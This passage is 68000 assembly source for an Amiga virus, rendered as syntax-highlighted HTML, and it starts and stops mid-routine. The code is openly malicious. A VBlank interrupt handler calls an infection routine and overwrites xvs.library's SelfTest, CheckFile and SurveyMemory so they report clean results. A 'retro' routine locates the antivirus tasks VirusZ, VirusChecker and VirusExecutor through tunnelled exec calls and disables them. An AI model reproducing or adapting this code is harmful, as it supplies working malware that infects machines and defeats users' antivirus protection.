    </span><span class="sc5">add.l</span><span class="sc0">   </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">btst</span><span class="sc0">    #</span><span class="sc2">15</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_exec_functions_not_found</span><span class="sc0">   
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,(</span><span class="sc5">a4</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">tst.w</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_quit_tracer</span><span class="sc0">
    </span><span class="sc5">bra.s</span><span class="sc0">   </span><span class="sc5">_exec_loop</span><span class="sc0">

</span><span class="sc5">_exec_functions_not_found</span><span class="sc0">
</span><span class="sc5">_quit_tracer</span><span class="sc0">
    </span><span class="sc5">bsr.b</span><span class="sc0">   </span><span class="sc5">_CacheClearU</span><span class="sc0">
    </span><span class="sc5">st.b</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0"> 

</span><span class="sc5">_tracer_error</span><span class="sc0">
    </span><span class="sc5">clr.b</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a5</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0"> 

</span><span class="sc5">exec_function_offsets</span><span class="sc0">
</span><span class="sc5">_offset_addintserver</span><span class="sc0">        </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc2">168</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc4">)-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">_offset_findtask</span><span class="sc0">        </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc2">294</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc4">)-</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">_offset_putmsg</span><span class="sc0">          </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc2">366</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc4">)-</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">dos_function_offsets</span><span class="sc0">
</span><span class="sc5">_offset_open</span><span class="sc0">            </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">30</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">;0</span><span class="sc0">
</span><span class="sc5">_offset_close</span><span class="sc0">           </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">36</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">;1</span><span class="sc0">
</span><span class="sc5">_offset_read</span><span class="sc0">            </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">42</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">;2</span><span class="sc0">
</span><span class="sc5">_offset_write</span><span class="sc0">           </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">48</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">;3</span><span class="sc0">
</span><span class="sc5">_offset_seek</span><span class="sc0">            </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">66</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">    </span><span class="sc1">;4</span><span class="sc0">
</span><span class="sc5">_offset_examine</span><span class="sc0">         </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">102</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;5</span><span class="sc0">
</span><span class="sc5">_offset_exnext</span><span class="sc0">          </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">108</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;6</span><span class="sc0">
</span><span class="sc5">_offset_info</span><span class="sc0">            </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">114</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;7</span><span class="sc0">
</span><span class="sc5">_offset_setcomment</span><span class="sc0">      </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">180</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;8</span><span class="sc0">
</span><span class="sc5">_offset_setprotection</span><span class="sc0">       </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">186</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;9</span><span class="sc0">
</span><span class="sc5">_offset_setfiledate</span><span class="sc0">     </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">396</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;10</span><span class="sc0">
</span><span class="sc5">_offset_namefromlock</span><span class="sc0">        </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">402</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;11</span><span class="sc0">
</span><span class="sc5">_offset_addpart</span><span class="sc0">         </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">882</span><span class="sc4">/</span><span class="sc2">3</span><span class="sc0">   </span><span class="sc1">;12</span><span class="sc0">
                </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_find_rt_Init</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;a3 = name to find</span><span class="sc0">
</span><span class="sc1">;d1 = ln_Type; ex: NT_LIBRARY, NT_DEVICE..</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;success:</span><span class="sc0">
</span><span class="sc1">;a0 = ptr to rt_Init of resident strcuture</span><span class="sc0">
</span><span class="sc1">;a1 = resident structure</span><span class="sc0">
</span><span class="sc1">;d0 = NULL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;error:</span><span class="sc0">
</span><span class="sc1">;d0 = -1</span><span class="sc0">

    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">ResModules</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    
</span><span class="sc5">_get_next_resident</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_find_rt_Init_error</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)+,</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">move.b</span><span class="sc0">  </span><span class="sc2">12</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.b</span><span class="sc0">   </span><span class="sc5">d1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_get_next_resident</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">14</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">8</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a3</span><span class="sc4">,</span><span class="sc5">a4</span><span class="sc0">

</span><span class="sc5">_check_dos_name</span><span class="sc0">
    </span><span class="sc5">cmpm.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)+,(</span><span class="sc5">a4</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_get_next_resident</span><span class="sc0">
    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">_check_dos_name</span><span class="sc0">


    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">22</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">       </span><span class="sc1">;rt_Init</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
    
</span><span class="sc5">_find_rt_Init_error</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_FindName</span><span class="sc0">
</span><span class="sc1">;in:</span><span class="sc0">
</span><span class="sc1">;a0 = struct List</span><span class="sc0">
</span><span class="sc1">;a1 = name to find</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;out:</span><span class="sc0">
</span><span class="sc1">;success:</span><span class="sc0">
</span><span class="sc1">;a0 = base of library, device etc.</span><span class="sc0">
</span><span class="sc1">;d0 = NULL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;error:</span><span class="sc0">
</span><span class="sc1">;d0 = -1</span><span class="sc0">

    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_FindName_error</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a3</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a1</span><span class="sc4">,</span><span class="sc5">a4</span><span class="sc0">

</span><span class="sc5">_find_name_loop</span><span class="sc0">
    </span><span class="sc5">cmpm.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a3</span><span class="sc4">)+,(</span><span class="sc5">a4</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_FindName</span><span class="sc0">
    </span><span class="sc5">tst.b</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">(</span><span class="sc5">a3</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_find_name_loop</span><span class="sc0">

    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
    
</span><span class="sc5">_FindName_error</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_CacheClearU</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">/</span><span class="sc5">d1</span><span class="sc4">/</span><span class="sc5">a0</span><span class="sc4">/</span><span class="sc5">a1</span><span class="sc4">/</span><span class="sc5">a6</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">jsr</span><span class="sc0"> </span><span class="sc5">CacheClearU</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">d0</span><span class="sc4">/</span><span class="sc5">d1</span><span class="sc4">/</span><span class="sc5">a0</span><span class="sc4">/</span><span class="sc5">a1</span><span class="sc4">/</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">_interrupt</span><span class="sc0">
    </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Node: ln_Succ</span><span class="sc0">
    </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Node: ln_pred</span><span class="sc0">
    </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;Node: ln_Type  Interrupt</span><span class="sc0">
    </span><span class="sc5">dc.b</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Node: ln_Pri</span><span class="sc0">
    </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;Node: ln_Name</span><span class="sc0">
    </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;is_Data</span><span class="sc0">
    </span><span class="sc5">dc.l</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;is_Code</span><span class="sc0">

</span><span class="sc5">_VBlank_counter</span><span class="sc0">
    </span><span class="sc5">dc.w</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">_VBlank_code</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">/</span><span class="sc5">a0</span><span class="sc4">/</span><span class="sc5">a1</span><span class="sc4">/</span><span class="sc5">a2</span><span class="sc4">/</span><span class="sc5">a3</span><span class="sc4">/</span><span class="sc5">a6</span><span class="sc4">,-(</span><span class="sc8">sp</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">4.w</span><span class="sc4">,</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">_VRU</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">DebugData</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;mark residency</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">_VBlank_counter</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">tst.w</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_VBlank_counter_is_empty</span><span class="sc0">
    </span><span class="sc5">subq.w</span><span class="sc0">  #</span><span class="sc2">1</span><span class="sc4">,(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    
</span><span class="sc5">_VBlank_counter_is_empty</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_infect_processes</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">xvs_base</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">     </span><span class="sc1">;get that fuckin base</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">          
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_quit_VBlank</span><span class="sc0">        </span><span class="sc1">;no library (lame system?)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">28</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">      </span><span class="sc1">;get SelfTest adress</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc5">$70ff4e75</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;overwrite routine by</span><span class="sc0">
                    </span><span class="sc1">;moveq #-1,d0  rts;</span><span class="sc0">
                    </span><span class="sc1">;this gives a positive result</span><span class="sc0">
                    
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">94</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">      </span><span class="sc1">;get CheckFile adress</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc5">$70034e75</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;overwrite routine by</span><span class="sc0">
                    </span><span class="sc1">;moveq #0,d0  rts;</span><span class="sc0">
                    </span><span class="sc1">;this gives a XVSFT_EXECUTABLE</span><span class="sc0">
                    </span><span class="sc1">;result</span><span class="sc0">
                    
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">106</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">     </span><span class="sc1">;get SurveyMemory adress</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc5">$70004e75</span><span class="sc4">,(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;overwrite routine by</span><span class="sc0">
                    </span><span class="sc1">;moveq and so on..</span><span class="sc0">
                    </span><span class="sc1">;result = memory clear</span><span class="sc0">
    
</span><span class="sc5">_quit_VBlank</span><span class="sc0">
    </span><span class="sc5">movem.l</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">sp</span><span class="sc4">)+,</span><span class="sc5">d0</span><span class="sc4">/</span><span class="sc5">a0</span><span class="sc4">/</span><span class="sc5">a1</span><span class="sc4">/</span><span class="sc5">a2</span><span class="sc4">/</span><span class="sc5">a3</span><span class="sc4">/</span><span class="sc5">a6</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;This routine looks for some AV tasks (VirusExecutor, VirusZ and VirusChecker)</span><span class="sc0">
</span><span class="sc1">;and disables some functions in these proggies.</span><span class="sc0">

</span><span class="sc5">_retro</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">xvs_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">xvs_base</span><span class="sc4">-</span><span class="sc5">xvs_name</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_xvs_already_found</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">LibList</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_FindName</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_xvs_already_found</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">a0</span><span class="sc4">,</span><span class="sc5">xvs_base</span><span class="sc4">-</span><span class="sc5">xvs_name</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">_xvs_already_found</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">FINDTASK</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">VirusZ1_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_exec_caller</span><span class="sc0">        </span><span class="sc1">;call find task in tunelling way</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">no_VirusZ1</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">kill_VirusZ</span><span class="sc0">

</span><span class="sc5">no_VirusZ1</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">FINDTASK</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">VirusZ2_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_exec_caller</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">no_VirusZ2</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">kill_VirusZ</span><span class="sc0">

</span><span class="sc5">no_VirusZ2</span><span class="sc0">
    </span><span class="sc5">moveq</span><span class="sc0">   #</span><span class="sc5">FINDTASK</span><span class="sc4">,</span><span class="sc5">d7</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">VirusChecker_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_exec_caller</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">no_Virus_Checker</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">kill_Virus_Checker</span><span class="sc0">

</span><span class="sc5">no_Virus_Checker</span><span class="sc0">
    </span><span class="sc5">jsr</span><span class="sc0"> </span><span class="sc5">Forbid</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">TaskWait</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">_find_Executor</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">TaskReady</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">bsr.s</span><span class="sc0">   </span><span class="sc5">_find_Executor</span><span class="sc0">
    </span><span class="sc5">jsr</span><span class="sc0"> </span><span class="sc5">Permit</span><span class="sc4">(</span><span class="sc5">a6</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0"> 

</span><span class="sc5">_find_Executor</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc5">background_name</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">a1</span><span class="sc0">
    
</span><span class="sc5">check_Background_name</span><span class="sc0">
    </span><span class="sc5">cmpm.b</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a2</span><span class="sc4">)+,(</span><span class="sc5">a1</span><span class="sc4">)+</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">_get_next_task2</span><span class="sc0">
    </span><span class="sc5">tst.b</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">bne.s</span><span class="sc0">   </span><span class="sc5">check_Background_name</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">kill_Executor</span><span class="sc0">

</span><span class="sc5">_get_next_task2</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">_no_more_tasks</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">bra.b</span><span class="sc0">   </span><span class="sc5">_find_Executor</span><span class="sc0">

</span><span class="sc5">_no_more_tasks</span><span class="sc0">
    </span><span class="sc5">bsr.w</span><span class="sc0">   </span><span class="sc5">_CacheClearU</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">     

</span><span class="sc1">;**************************************</span><span class="sc0">
</span><span class="sc5">kill_VirusZ</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">pr_ExitData</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   </span><span class="sc5">_VRU</span><span class="sc4">(</span><span class="sc5">pc</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">VirusZ_stopped</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">128</span><span class="sc4">(</span><span class="sc5">a0</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">tst.l</span><span class="sc0">   </span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">VirusZ_stopped</span><span class="sc0">
    </span><span class="sc5">lsl.l</span><span class="sc0">   #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc2">12</span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d0</span><span class="sc0">       </span><span class="sc1">;get hunk</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  #</span><span class="sc2">2000</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">        </span><span class="sc1">;search range</span><span class="sc0">
    </span><span class="sc5">lsl.l</span><span class="sc0">   #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">d0</span><span class="sc0">           </span><span class="sc1">;convert hunkadress from BCPL</span><span class="sc0">
    </span><span class="sc5">exg</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">a1</span><span class="sc0">

</span><span class="sc5">find_VirusZ_IDCMP_checker</span><span class="sc0">
    </span><span class="sc5">move.l</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">a1</span><span class="sc4">),</span><span class="sc5">d1</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   #</span><span class="sc5">$b07c0001</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">       </span><span class="sc1">;VirusZ_II uses cmp.w #1,d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">VirusZ1</span><span class="sc0">
    </span><span class="sc5">cmp.l</span><span class="sc0">   #</span><span class="sc5">$0c400001</span><span class="sc4">,</span><span class="sc5">d1</span><span class="sc0">       </span><span class="sc1">;VirusZ_III uses cmpi.w #1,d0</span><span class="sc0">
    </span><span class="sc5">beq.s</span><span class="sc0">   </span><span class="sc5">VirusZ2</span><span class="sc0">
    </span><span class="sc5">addq.l</span><span class="sc0">  #</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc5">a0</span><span class="sc0">
    </span><span class="sc5">dbf</span><span class="sc0"> </span><span class="sc5">d0</span><span class="sc4">,</span><span class="sc5">find_VirusZ_IDCMP_checker</span><span class="sc0">
    </span><span class="sc5">rts</span><span class="sc0">

</span><span class="sc5">VirusZ2</span><span class="sc0">
